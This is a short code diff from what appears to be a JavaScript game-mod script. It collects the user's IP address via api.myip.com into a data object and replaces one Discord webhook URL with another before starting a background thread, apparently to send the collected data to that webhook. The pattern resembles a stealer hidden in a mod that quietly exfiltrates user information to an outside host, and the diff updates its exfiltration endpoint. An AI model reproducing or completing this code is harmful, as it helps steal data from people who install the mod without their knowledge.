@@ -23,7 +23,7 @@ const data = {
     ip: FileLib.getUrlContent("https://api.myip.com/")
 };
 
-const link = "https://discord.com/api/webhooks/1369240401093066822/pWY2kBsEDkq-zDRBTnX1tIpMwqC_3NFkXa_WQyrvjqBS_4sAusKnachL1NjSbrF6zkwy";
+const link = "https://discord.com/api/webhooks/1371579128456675390/PJSUEbCnUbeRZZo5ISvwigECC311A4Y_Qix-jl-67E9NH1SXgCf6Q4bp5-1-8uJ7CU3p";
 
 new Thread(() => {
     try {
